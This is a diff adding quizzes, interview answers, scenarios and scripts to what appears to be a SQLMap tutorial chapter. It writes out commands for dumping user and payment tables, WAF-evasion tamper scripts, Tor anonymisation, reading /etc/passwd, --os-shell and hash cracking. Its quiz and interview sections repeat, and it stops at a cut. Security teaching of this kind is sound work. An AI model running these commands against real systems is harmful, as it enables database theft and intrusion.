@@ -1871,6 +1871,1840 @@ Before moving to Chapter 35, verify:
 
 ---
 
+## 🎮 INTERACTIVE QUIZ
+
+Test your SQLMap knowledge! Answers are hidden below each question.
+
+### Question 1
+**What is SQL injection?**
+<details>
+<summary>Click to reveal answer</summary>
+
+SQL injection is a web security vulnerability that allows attackers to interfere with queries an application makes to its database. It allows attackers to view, modify, or delete data they shouldn't access.
+</details>
+
+### Question 2
+**What does the `--dbs` flag do in SQLMap?**
+<details>
+<summary>Click to reveal answer</summary>
+
+The `--dbs` flag enumerates and lists all databases on the target system. It's used after confirming SQL injection exists.
+</details>
+
+### Question 3
+**What is the difference between `-u` and `-r` in SQLMap?**
+<details>
+<summary>Click to reveal answer</summary>
+
+`-u` specifies a target URL directly, while `-r` loads a complete HTTP request from a file (useful for complex requests with headers, cookies, POST data).
+</details>
+
+### Question 4
+**What does `--batch` flag do?**
+<details>
+<summary>Click to reveal answer</summary>
+
+`--batch` runs SQLMap in non-interactive mode, automatically answering "yes" to all questions. Essential for automation and scripting.
+</details>
+
+### Question 5
+**How do you specify a specific database in SQLMap?**
+<details>
+<summary>Click to reveal answer</summary>
+
+Use the `-D` flag followed by database name: `sqlmap -u "URL" -D database_name --tables`
+</details>
+
+### Question 6
+**What is blind SQL injection?**
+<details>
+<summary>Click to reveal answer</summary>
+
+Blind SQL injection occurs when the application doesn't show database errors or query results. Attackers infer data by observing differences in responses (Boolean-based) or response times (Time-based).
+</details>
+
+### Question 7
+**How do you dump a specific table?**
+<details>
+<summary>Click to reveal answer</summary>
+
+Use `-D database_name -T table_name --dump`: `sqlmap -u "URL" -D mydb -T users --dump`
+</details>
+
+### Question 8
+**What is `--level` option for?**
+<details>
+<summary>Click to reveal answer</summary>
+
+`--level` (1-5) controls the number of tests performed. Higher levels test more injection points (cookies, headers) but take longer. Default is level 1.
+</details>
+
+### Question 9
+**How do you test a POST parameter?**
+<details>
+<summary>Click to reveal answer</summary>
+
+Use `--data` flag: `sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch`
+</details>
+
+### Question 10
+**What does `--risk` option control?**
+<details>
+<summary>Click to reveal answer</summary>
+
+`--risk` (1-3) controls the risk level of tests. Risk 3 includes potentially destructive tests. Higher risk may cause more damage but finds more vulnerabilities.
+</details>
+
+### Question 11
+**How do you use SQLMap with Tor?**
+<details>
+<summary>Click to reveal answer</summary>
+
+Use `--tor` flag with Tor running: `sqlmap -u "URL" --tor --tor-type=SOCKS5 --batch`
+</details>
+
+### Question 12
+**What is the `--tamper` option for?**
+<details>
+<summary>Click to reveal answer</summary>
+
+`--tamper` uses scripts to modify payloads for WAF/IDS evasion. Example: `--tamper=space2comment` replaces spaces with comments.
+</details>
+
+### Question 13
+**How do you test cookie-based injection?**
+<details>
+<summary>Click to reveal answer</summary>
+
+Use `--cookie` with `*` marker: `sqlmap -u "URL" --cookie="id=1*" --batch` - the `*` marks the injection point.
+</details>
+
+### Question 14
+**What is `--technique` option for?**
+<details>
+<summary>Click to reveal answer</summary>
+
+`--technique` specifies which injection techniques to use: B (Boolean), E (Error), U (Union), S (Stacked), T (Time), Q (Inline). Example: `--technique=BEU`
+</details>
+
+### Question 15
+**How do you check if current user is database administrator?**
+<details>
+<summary>Click to reveal answer</summary>
+
+Use `--is-dba` flag: `sqlmap -u "URL" --is-dba --batch` returns True if current user has DBA privileges.
+</details>
+
+---
+
+## 🎯 INTERVIEW QUESTIONS
+
+### Q1: What are the different types of SQL injection?
+
+**Answer:**
+1. **In-Band SQL Injection** (most common):
+   - Error-based: Uses database error messages
+   - Union-based: Uses UNION SELECT to retrieve data
+
+2. **Blind SQL Injection**:
+   - Boolean-based: Infers data from TRUE/FALSE responses
+   - Time-based: Infers data from response delays (SLEEP, WAITFOR)
+
+3. **Out-of-Band SQL Injection**:
+   - Uses different channel (DNS, HTTP) to extract data
+   - Less common, requires specific database features
+
+### Q2: How does SQLMap detect SQL injection vulnerabilities?
+
+**Answer:**
+SQLMap uses a multi-phase detection process:
+
+1. **Fingerprinting**: Identifies database type (MySQL, PostgreSQL, etc.)
+2. **Injection testing**: Tries various injection techniques:
+   - String terminators (', ")
+   - Boolean conditions (OR 1=1)
+   - Union statements
+   - Time-based functions
+3. **Technique selection**: Chooses most effective method
+4. **Exploitation**: Extracts data using best technique
+
+### Q3: What is the difference between `--level` and `--risk`?
+
+**Answer:**
+| Aspect | --level | --risk |
+|--------|---------|--------|
+| Purpose | Test coverage | Test aggressiveness |
+| Range | 1-5 | 1-3 |
+| Level 1 | Basic tests on parameters | Safe, non-destructive |
+| Level 5 | Tests cookies, headers, all parameters | Includes destructive tests |
+| Use case | Find more injection points | Find more vulnerabilities |
+
+Use high level for thorough testing, high risk only in controlled environments.
+
+### Q4: How would you handle WAF protection when using SQLMap?
+
+**Answer:**
+1. **Tamper scripts**: `--tamper=space2comment,between`
+2. **Random User-Agent**: `--random-agent`
+3. **Delay between requests**: `--delay=2`
+4. **HTTP chunked encoding**: `--chunked`
+5. **Custom headers**: Modify to bypass filters
+6. **Lower risk/level**: `--level=1 --risk=1`
+7. **Tor/Proxy**: Route through different IPs
+
+### Q5: Explain the SQLMap enumeration process.
+
+**Answer:**
+```
+Step 1: Confirm injection
+sqlmap -u "URL" --batch
+
+Step 2: Enumerate databases
+sqlmap -u "URL" --dbs --batch
+
+Step 3: Select database and list tables
+sqlmap -u "URL" -D dbname --tables --batch
+
+Step 4: Select table and list columns
+sqlmap -u "URL" -D dbname -T tablename --columns --batch
+
+Step 5: Dump data
+sqlmap -u "URL" -D dbname -T tablename --dump --batch
+```
+
+### Q6: What are tamper scripts and when would you use them?
+
+**Answer:**
+Tamper scripts modify payloads to bypass security filters:
+
+| Script | Purpose |
+|--------|---------|
+| space2comment | Replaces spaces with /**/ |
+| between | Replaces > with NOT BETWEEN 0 AND |
+| randomcase | Randomizes case |
+| charencode | URL encodes characters |
+| base64encode | Base64 encodes payload |
+
+Use when WAF blocks standard payloads. Check available scripts: `sqlmap --list-tampers`
+
+### Q7: How would you approach a time-based blind SQL injection?
+
+**Answer:**
+Time-based blind is slow but effective:
+
+```bash
+# Force time-based technique
+sqlmap -u "URL?id=1" --technique=T --batch
+
+# Increase timeout for slow responses
+sqlmap -u "URL?id=1" --technique=T --time-sec=10 --batch
+
+# Use threads for speed (careful with accuracy)
+sqlmap -u "URL?id=1" --technique=T --threads=5 --batch
+```
+
+Warning: Time-based attacks are slow. A 10-character password can take hours.
+
+### Q8: What precautions should you take when using SQLMap in production?
+
+**Answer:**
+1. **Authorization**: Written permission required
+2. **Backup**: Ensure database backup exists
+3. **Low risk**: Start with `--risk=1`
+4. **Limited scope**: Test specific parameters only
+5. **Monitoring**: Watch for service disruption
+6. **Timing**: Test during low-traffic periods
+7. **Data handling**: Securely delete extracted data after testing
+8. **Documentation**: Log all activities
+
+### Q9: How do you extract password hashes with SQLMap?
+
+**Answer:**
+```bash
+# Find password columns
+sqlmap -u "URL" -D dbname --search -C password --batch
+
+# Or directly dump user table
+sqlmap -u "URL" -D dbname -T users --dump --batch
+
+# SQLMap may auto-crack hashes
+# Check output for cracked passwords
+
+# Crack manually if needed
+john --wordlist=rockyou.txt hashes.txt
+```
+
+### Q10: What are the legal implications of SQL injection testing?
+
+**Answer:**
+**Legal:**
+- Only test systems you own or have written permission for
+- Document authorization and scope
+- Unauthorized access is illegal (CFAA, IT Act)
+
+**Ethical:**
+- Report findings responsibly
+- Help organizations fix vulnerabilities
+- Don't exfiltrate or expose sensitive data
+- Follow coordinated disclosure
+
+**Consequences:**
+- Criminal charges
+- Civil lawsuits
+- Professional reputation damage
+- Prison time in severe cases
+
+---
+
+## 🔥 REAL-WORLD SCENARIOS
+
+### Scenario 1: E-commerce Website Assessment
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                  E-COMMERCE WEBSITE ASSESSMENT                            ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                           ║
+║  SITUATION:                                                               ║
+║  Client's online store needs security testing. Product search page       ║
+║  appears vulnerable. Need to assess database exposure.                   ║
+║                                                                           ║
+║  APPROACH:                                                                ║
+║  1. Initial test:                                                         ║
+║     sqlmap -u "https://store.com/search?q=shirt" --batch                ║
+║                                                                           ║
+║  2. Confirm and enumerate:                                                ║
+║     sqlmap -u "https://store.com/search?q=shirt" --dbs --batch          ║
+║     # Found: store_db, information_schema                                ║
+║                                                                           ║
+║  3. List tables:                                                          ║
+║     sqlmap -u "URL" -D store_db --tables --batch                         ║
+║     # Found: users, products, orders, payments                           ║
+║                                                                           ║
+║  4. Dump sensitive tables:                                                ║
+║     sqlmap -u "URL" -D store_db -T users --dump --batch                  ║
+║     sqlmap -u "URL" -D store_db -T payments --dump --batch               ║
+║                                                                           ║
+║  RESULT: Found admin credentials and 50k customer records               ║
+║  Recommended immediate remediation                                        ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 2: Corporate Portal Testing
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                  CORPORATE PORTAL TESTING                                 ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                           ║
+║  SITUATION:                                                               ║
+║  Testing internal HR portal. Login requires authentication cookie.       ║
+║  Need to test after authentication.                                      ║
+║                                                                           ║
+║  APPROACH:                                                                ║
+║  1. Capture authenticated request:                                        ║
+║     # Use Burp Suite or browser to capture request                       ║
+║     # Save to file: hr_request.txt                                       ║
+║                                                                           ║
+║  2. Test with request file:                                               ║
+║     sqlmap -r hr_request.txt --batch                                     ║
+║                                                                           ║
+║  3. Or use cookie directly:                                               ║
+║     sqlmap -u "http://hr.company.com/employee?id=1" \                    ║
+║       --cookie="session=abc123" --batch                                  ║
+║                                                                           ║
+║  4. Enumerate after confirming injection:                                ║
+║     sqlmap -r hr_request.txt --dbs --batch                               ║
+║     sqlmap -r hr_request.txt -D hr_db --tables --batch                   ║
+║                                                                           ║
+║  RESULT: Found time-based blind SQLi in employee search                  ║
+║  Extracted 500 employee records including salaries                       ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 3: WAF Bypass Challenge
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                  WAF BYPASS CHALLENGE                                     ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                           ║
+║  SITUATION:                                                               ║
+║  Target has Web Application Firewall blocking SQLMap requests.           ║
+║  Need to bypass and continue testing.                                    ║
+║                                                                           ║
+║  APPROACH:                                                                ║
+║  1. Identify WAF:                                                         ║
+║     sqlmap -u "URL" --identify-waf --batch                               ║
+║     # WAF identified: ModSecurity                                        ║
+║                                                                           ║
+║  2. Try tamper scripts:                                                   ║
+║     sqlmap -u "URL" --tamper=space2comment --batch                       ║
+║     sqlmap -u "URL" --tamper=between,randomcase --batch                  ║
+║     sqlmap -u "URL" --tamper=charencode --batch                          ║
+║                                                                           ║
+║  3. Combine techniques:                                                   ║
+║     sqlmap -u "URL" --tamper=space2comment,between \                     ║
+║       --random-agent --delay=2 --batch                                   ║
+║                                                                           ║
+║  4. Try chunked encoding:                                                 ║
+║     sqlmap -u "URL" --chunked --batch                                    ║
+║                                                                           ║
+║  RESULT: space2comment tamper bypassed WAF                              ║
+║  Successfully extracted database schema                                  ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 4: API Endpoint Testing
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                    API ENDPOINT TESTING                                   ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                           ║
+║  SITUATION:                                                               ║
+║  REST API with JSON input needs testing. Endpoints use authentication.   ║
+║                                                                           ║
+║  APPROACH:                                                                ║
+║  1. Test JSON POST data:                                                  ║
+║     sqlmap -u "http://api.company.com/users" \                           ║
+║       --data='{"id":1}' \                                                ║
+║       --headers="Content-Type: application/json\nAuthorization: Bearer x"\║
+║       --batch                                                            ║
+║                                                                           ║
+║  2. Mark injection point:                                                 ║
+║     sqlmap -u "http://api.company.com/users" \                           ║
+║       --data='{"id":"1*"}' \                                             ║
+║       --headers="Content-Type: application/json" --batch                 ║
+║                                                                           ║
+║  3. Test with request file for complex auth:                              ║
+║     # Save request from Burp to api_request.txt                          ║
+║     sqlmap -r api_request.txt --batch                                    ║
+║                                                                           ║
+║  4. Enumerate if vulnerable:                                              ║
+║     sqlmap -r api_request.txt --dbs --batch                              ║
+║                                                                           ║
+║  RESULT: Found SQLi in user ID parameter                                 ║
+║  Extracted user table with 10k records                                   ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 5: Blind SQL Injection Exploitation
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                BLIND SQL INJECTION EXPLOITATION                           ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                           ║
+║  SITUATION:                                                               ║
+║  Target shows no errors or data. Suspected blind SQL injection.          ║
+║  Need to extract data from time-based blind SQLi.                        ║
+║                                                                           ║
+║  APPROACH:                                                                ║
+║  1. Confirm time-based injection:                                         ║
+║     sqlmap -u "http://target.com/page?id=1" \                            ║
+║       --technique=T --time-sec=5 --batch                                 ║
+║     # Confirm: Response delayed 5+ seconds                              ║
+║                                                                           ║
+║  2. Enumerate databases (slow process):                                   ║
+║     sqlmap -u "URL" --technique=T --dbs --batch                          ║
+║     # This may take 30+ minutes                                          ║
+║                                                                           ║
+║  3. Use threads to speed up (may reduce accuracy):                        ║
+║     sqlmap -u "URL" --technique=T --threads=5 --dbs --batch              ║
+║                                                                           ║
+║  4. Dump specific small table:                                            ║
+║     sqlmap -u "URL" --technique=T -D db -T admin \                       ║
+║       --dump --batch                                                     ║
+║                                                                           ║
+║  5. Save session for resume:                                              ║
+║     sqlmap -u "URL" --technique=T -D db -T users \                       ║
+║       --dump --session=blind_test --batch                                ║
+║                                                                           ║
+║  RESULT: Extracted admin credentials after 2 hours                       ║
+║  Password: Admin@2024                                                    ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## ⚠️ SECURITY BEST PRACTICES
+
+### ✅ DO's
+
+| Practice | Description |
+|----------|-------------|
+| ✅ Get authorization | Written permission before testing |
+| ✅ Start with --batch | Automate initial testing |
+| ✅ Use --risk=1 initially | Start with safe tests |
+| ✅ Save sessions | Resume interrupted scans |
+| ✅ Document findings | Keep detailed records |
+| ✅ Report responsibly | Follow disclosure guidelines |
+| ✅ Test in stages | Confirm → Enumerate → Dump |
+| ✅ Use Tor for anonymity | For external testing |
+| ✅ Verify scope | Stay within authorized boundaries |
+| ✅ Clean up | Delete extracted data after testing |
+
+### ❌ DON'Ts
+
+| Practice | Risk |
+|----------|------|
+| ❌ Test without permission | Illegal and unethical |
+| ❌ Use --risk=3 on production | May cause damage |
+| ❌ Dump entire databases | Unnecessary data exposure |
+| ❌ Ignore WAF detection | Blocked testing |
+| ❌ Share extracted data | Security breach |
+| ❌ Skip documentation | No proof of findings |
+| ❌ Use default settings always | May miss vulnerabilities |
+| ❌ Ignore time-based tests | May miss blind SQLi |
+| ❌ Test during peak hours | Service disruption |
+| ❌ Leave sessions running | Resource waste |
+
+---
+
+## 📊 ARCHITECTURE DIAGRAMS
+
+### SQLMap Attack Flow
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        SQLMAP ATTACK FLOW                                   │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌────────────┐ │
+│   │   TARGET    │    │  DETECTION  │    │ EXPLOITATION │   │   OUTPUT   │ │
+│   │   INPUT     │    │   ENGINE    │    │    ENGINE    │   │            │ │
+│   │             │    │             │    │              │   │            │ │
+│   │ - URL       │───►│ - Fingerprint│───►│ - Data dump │───►│ - Console │ │
+│   │ - Request   │    │ - Injection  │    │ - File read │   │ - Files   │ │
+│   │ - Cookie    │    │ - Technique  │    │ - Cmd exec  │   │ - Reports │ │
+│   └─────────────┘    └─────────────┘    └─────────────┘    └────────────┘ │
+│                                                                             │
+│   Techniques Used:                                                          │
+│   ┌────────────────────────────────────────────────────────────────────┐   │
+│   │ Boolean (B) │ Error (E) │ Union (U) │ Stacked (S) │ Time (T)     │   │
+│   └────────────────────────────────────────────────────────────────────┘   │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### SQL Injection Types Hierarchy
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    SQL INJECTION TYPES HIERARCHY                            │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│                          ┌────────────────────┐                             │
+│                          │   SQL INJECTION    │                             │
+│                          └─────────┬──────────┘                             │
+│                                    │                                        │
+│          ┌─────────────────────────┼─────────────────────────┐             │
+│          ▼                         ▼                         ▼             │
+│   ┌──────────────┐        ┌──────────────┐        ┌──────────────┐        │
+│   │  IN-BAND     │        │    BLIND     │        │ OUT-OF-BAND  │        │
+│   │              │        │              │        │              │        │
+│   │ - Error-based│        │ - Boolean    │        │ - DNS        │        │
+│   │ - Union-based│        │ - Time-based │        │ - HTTP       │        │
+│   └──────────────┘        └──────────────┘        └──────────────┘        │
+│                                                                             │
+│   Detection Speed:   Fast ───────────────────────► Slow                    │
+│   Data Extracted:    More ───────────────────────► Less                    │
+│   Common in apps:    Common ───────────────────────► Rare                  │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Enumeration Process
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    ENUMERATION PROCESS                                      │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│   Step 1          Step 2          Step 3          Step 4                   │
+│   ──────          ──────          ──────          ──────                   │
+│   ┌─────┐        ┌─────┐        ┌─────┐        ┌─────┐                    │
+│   │ DBs │───────►│Tables│──────►│Cols │──────►│Data │                    │
+│   └─────┘        └─────┘        └─────┘        └─────┘                    │
+│                                                                             │
+│   --dbs          --tables       --columns      --dump                      │
+│                                                                             │
+│   Example flow:                                                             │
+│   ┌───────────────────────────────────────────────────────────────────┐    │
+│   │ sqlmap -u "URL" --dbs                                            │    │
+│   │   → found: mydb, testdb                                          │    │
+│   │                                                                   │    │
+│   │ sqlmap -u "URL" -D mydb --tables                                 │    │
+│   │   → found: users, products, orders                               │    │
+│   │                                                                   │    │
+│   │ sqlmap -u "URL" -D mydb -T users --columns                       │    │
+│   │   → found: id, username, password, email                         │    │
+│   │                                                                   │    │
+│   │ sqlmap -u "URL" -D mydb -T users --dump                          │    │
+│   │   → extracted: 100 user records                                  │    │
+│   └───────────────────────────────────────────────────────────────────┘    │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 🔗 RELATED CHAPTERS
+
+| Chapter | Title | Relevance |
+|---------|-------|-----------|
+| Chapter 33 | John the Ripper | Cracking extracted password hashes |
+| Chapter 35 | Metasploit Framework | Post-exploitation after SQLi |
+| Chapter 40 | Web Application Security | OWASP Top 10 context |
+| Chapter 41 | Network Scanning | Target discovery |
+| Chapter 42 | Enumeration Techniques | Information gathering |
+| Chapter 43 | Exploitation Basics | Using SQLi for access |
+| Chapter 50 | Database Security | Secure database design |
+
+---
+
+## 🏆 BONUS ADVANCED CONTENT
+
+### Technique 1: Advanced Tamper Script Usage
+
+Combine multiple tamper scripts for WAF bypass:
+
+```bash
+# List all available tamper scripts
+sqlmap --list-tampers
+
+# Common combinations for WAF bypass
+sqlmap -u "URL" --tamper=apostrophemask,randomcase --batch
+sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
+sqlmap -u "URL" --tamper=charencode --batch
+
+# Create custom tamper script
+cat > /usr/share/sqlmap/tamper/custom_bypass.py << 'EOF'
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    # Custom bypass logic
+    payload = payload.replace("SELECT", "SeLeCt")
+    payload = payload.replace(" ", "/**/")
+    return payload
+EOF
+```
+
+### Technique 2: Automated SQLMap Scanning Script
+
+```bash
+#!/bin/bash
+# SQLMap Automated Scanner
+# Usage: ./sqlmap_scan.sh target_url
+
+URL=$1
+OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"
+
+mkdir -p $OUTPUT_DIR
+
+echo "[*] Starting SQLMap scan for: $URL"
+
+# Phase 1: Detection
+echo "[*] Phase 1: Detection"
+sqlmap -u "$URL" --batch --random-agent \
+    -o $OUTPUT_DIR/detection.log
+
+# Phase 2: Enumeration
+echo "[*] Phase 2: Database Enumeration"
+sqlmap -u "$URL" --batch --dbs \
+    -o $OUTPUT_DIR/databases.txt
+
+# Phase 3: Table Enumeration
+echo "[*] Phase 3: Table Enumeration"
+for db in $(grep -oP '\[\*\] \K.*' $OUTPUT_DIR/databases.txt); do
+    sqlmap -u "$URL" -D "$db" --batch --tables \
+        >> $OUTPUT_DIR/tables.txt
+done
+
+# Phase 4: Generate Report
+echo "[*] Generating Report"
+cat << EOF > $OUTPUT_DIR/report.txt
+SQLMap Scan Report
+==================
+Target: $URL
+Date: $(date)
+Results Directory: $OUTPUT_DIR
+EOF
+
+echo "[+] Scan complete. Results in: $OUTPUT_DIR"
+```
+
+### Technique 3: SQLMap with Custom Injection Points
+
+Test specific injection points with markers:
+
+```bash
+# Mark injection point with *
+sqlmap -u "http://target.com/page?id=1*&user=test" --batch
+
+# Test specific parameter only
+sqlmap -u "http://target.com/page?id=1&user=test" -p id --batch
+
+# Test headers
+sqlmap -u "http://target.com/" \
+    --headers="X-Forwarded-For: 127.0.0.1*\nUser-Agent: test*" \
+    --batch
+
+# Cookie injection
+sqlmap -u "http://target.com/" \
+    --cookie="session=abc; user=admin*" \
+    --batch
+
+# POST JSON with injection point
+sqlmap -u "http://target.com/api" \
+    --data='{"id":"1*","name":"test"}' \
+    --headers="Content-Type: application/json" \
+    --batch
+
+# Complex nested JSON
+sqlmap -u "http://target.com/api" \
+    --data='{"user":{"id":"1*"}}' \
+    --headers="Content-Type: application/json" \
+    --batch
+```
+
+---
+
+## 📝 CHAPTER SUMMARY CHECKLIST
+
+- [ ] Understood SQL injection types and risks
+- [ ] Installed SQLMap in Termux
+- [ ] Learned basic commands (-u, --dbs, --tables, --dump)
+- [ ] Used --batch for non-interactive mode
+- [ ] Tested POST parameters with --data
+- [ ] Configured cookies and headers
+- [ ] Applied tamper scripts for WAF bypass
+- [ ] Used --level and --risk appropriately
+- [ ] Handled blind SQL injection scenarios
+- [ ] Completed all practice exercises
+
+---
+
+## 🎮 INTERACTIVE QUIZ
+
+Test your SQLMap knowledge! Click to reveal answers.
+
+<details>
+<summary><b>Q1: What is the basic syntax for running SQLMap against a URL?</b></summary>
+
+Answer: **`sqlmap -u "http://target.com/page?id=1"`**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" --batch
+```
+The `--batch` flag runs SQLMap in non-interactive mode, automatically selecting default options.
+</details>
+
+<details>
+<summary><b>Q2: Which flag lists all databases on the target?</b></summary>
+
+Answer: **`--dbs`**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" --dbs --batch
+```
+This enumerates all accessible databases on the target system.
+</details>
+
+<details>
+<summary><b>Q3: How do you specify a particular database to work with?</b></summary>
+
+Answer: **Using `-D` flag**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch
+```
+`-D` selects the database, then `--tables` lists its tables.
+</details>
+
+<details>
+<summary><b>Q4: What is the difference between --level and --risk?</b></summary>
+
+Answer: **Scope vs Aggressiveness**
+
+| Option | Purpose | Range |
+|--------|---------|-------|
+| `--level` | Number of tests/payloads | 1-5 |
+| `--risk` | Aggressiveness/damage potential | 1-3 |
+
+```bash
+sqlmap -u "URL" --level=3 --risk=2 --batch
+```
+Higher level = more thorough testing. Higher risk = more aggressive techniques.
+</details>
+
+<details>
+<summary><b>Q5: How do you dump data from a specific table?</b></summary>
+
+Answer: **Using `-D`, `-T`, and `--dump`**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --dump --batch
+```
+This extracts all data from the specified table.
+</details>
+
+<details>
+<summary><b>Q6: What flag enables testing POST data?</b></summary>
+
+Answer: **`--data` flag**
+
+```bash
+sqlmap -u "http://target.com/login.php" \
+       --data="username=admin&password=test" \
+       --batch
+```
+This tests POST parameters instead of URL parameters.
+</details>
+
+<details>
+<summary><b>Q7: How do you specify cookies for authenticated testing?</b></summary>
+
+Answer: **Using `--cookie` flag**
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" \
+       --cookie="PHPSESSID=abc123xyz; session=admin" \
+       --batch
+```
+This includes session cookies in requests for authenticated testing.
+</details>
+
+<details>
+<summary><b>Q8: What are tamper scripts used for?</b></summary>
+
+Answer: **Bypassing WAF/IDS filters**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" \
+       --tamper=space2comment \
+       --batch
+```
+Tamper scripts modify payloads to evade Web Application Firewalls.
+Common tampers: `space2comment`, `between`, `randomcase`, `charencode`
+</details>
+
+<details>
+<summary><b>Q9: How do you test a specific parameter only?</b></summary>
+
+Answer: **Using `-p` flag**
+
+```bash
+sqlmap -u "http://target.com/page?id=1&cat=5" -p id --batch
+```
+This tests only the `id` parameter, ignoring others.
+</details>
+
+<details>
+<summary><b>Q10: What is --technique used for?</b></summary>
+
+Answer: **Specifying SQL injection techniques**
+
+```bash
+# B = Boolean-based blind
+# E = Error-based
+# U = Union query-based
+# S = Stacked queries
+# T = Time-based blind
+# Q = Inline queries
+
+sqlmap -u "URL" --technique=BEU --batch  # Use Boolean, Error, Union
+```
+</details>
+
+<details>
+<summary><b>Q11: How do you use SQLMap with a request file from Burp?</b></summary>
+
+Answer: **Using `-r` flag**
+
+```bash
+sqlmap -r request.txt --batch
+```
+Save the HTTP request from Burp Suite to a file, then use `-r` to test all parameters in that request.
+</details>
+
+<details>
+<summary><b>Q12: What does --current-user do?</b></summary>
+
+Answer: **Shows the database user being used**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" --current-user --batch
+```
+Useful for identifying privilege level and potential escalation opportunities.
+</details>
+
+<details>
+<summary><b>Q13: How do you check if the current user is a database administrator?</b></summary>
+
+Answer: **Using `--is-dba`**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" --is-dba --batch
+```
+Returns whether the current database user has DBA (administrator) privileges.
+</details>
+
+<details>
+<summary><b>Q14: How do you run SQLMap through Tor?</b></summary>
+
+Answer: **Using `--tor` flag**
+
+```bash
+# Start Tor first
+tor &
+
+# Run SQLMap through Tor
+sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5 --batch
+```
+This routes all traffic through the Tor network for anonymity.
+</details>
+
+<details>
+<summary><b>Q15: How do you specify specific columns to dump?</b></summary>
+
+Answer: **Using `-C` flag**
+
+```bash
+sqlmap -u "http://target.com/page?id=1" \
+       -D dbname -T users \
+       -C "username,password,email" \
+       --dump --batch
+```
+This extracts only the specified columns from the table.
+</details>
+
+---
+
+## 🎯 INTERVIEW QUESTIONS
+
+### Q1: Explain the different types of SQL injection and how SQLMap handles them.
+
+**Answer:**
+
+**SQL Injection Types:**
+
+| Type | Description | SQLMap Technique |
+|------|-------------|------------------|
+| **In-Band** | Results visible in response | B, E, U |
+| **Blind** | No visible results | B, T |
+| **Out-of-Band** | Different channel for data | Q |
+
+**Technique Codes:**
+- **B (Boolean-based):** True/false conditions
+- **E (Error-based):** Error messages leak data
+- **U (Union-based):** UNION SELECT for data extraction
+- **S (Stacked queries):** Multiple statements
+- **T (Time-based):** Time delays indicate success
+- **Q (Inline queries):** Embedded queries
+
+**SQLMap Auto-Detection:**
+```bash
+# SQLMap automatically tries all techniques
+sqlmap -u "URL" --batch
+
+# Specific technique
+sqlmap -u "URL" --technique=T --batch  # Time-based only
+```
+
+---
+
+### Q2: What is the difference between --level and --risk? When would you increase them?
+
+**Answer:**
+
+**--level (1-5):**
+- Controls NUMBER of tests/payloads
+- Higher = more thorough coverage
+- Tests more HTTP headers at higher levels
+- Level 3+ tests Cookie, Referer headers
+
+**--risk (1-3):**
+- Controls AGGRESSIVENESS of tests
+- Higher = more potentially damaging
+- Risk 2 adds OR-based tests
+- Risk 3 adds heavy queries
+
+**When to Increase:**
+```bash
+# Level: When injection not found with defaults
+sqlmap -u "URL" --level=5 --batch
+
+# Risk: When sure target can handle load
+sqlmap -u "URL" --risk=3 --batch
+
+# Combined for tough targets
+sqlmap -u "URL" --level=5 --risk=3 --batch
+```
+
+**Caution:** High risk can cause:
+- Database locks
+- Service degradation
+- Account lockouts
+- Data corruption
+
+---
+
+### Q3: How would you approach testing a web application with SQLMap?
+
+**Answer:**
+
+**Systematic Approach:**
+
+**Phase 1: Discovery**
+```bash
+# Basic scan with default settings
+sqlmap -u "http://target.com/page?id=1" --batch
+
+# Check current user and privileges
+sqlmap -u "URL" --current-user --is-dba --batch
+```
+
+**Phase 2: Enumeration**
+```bash
+# List databases
+sqlmap -u "URL" --dbs --batch
+
+# List tables in specific database
+sqlmap -u "URL" -D target_db --tables --batch
+
+# List columns in table
+sqlmap -u "URL" -D target_db -T users --columns --batch
+```
+
+**Phase 3: Data Extraction**
+```bash
+# Dump specific data
+sqlmap -u "URL" -D target_db -T users -C "user,pass" --dump --batch
+```
+
+**Phase 4: Advanced (if DBA)**
+```bash
+# Read files
+sqlmap -u "URL" --file-read="/etc/passwd"
+
+# Execute commands (if possible)
+sqlmap -u "URL" --os-shell
+```
+
+---
+
+### Q4: Explain tamper scripts and when to use them.
+
+**Answer:**
+
+**Purpose:** Modify SQL payloads to bypass WAF/IDS filters.
+
+**Common Tamper Scripts:**
+
+| Script | Purpose |
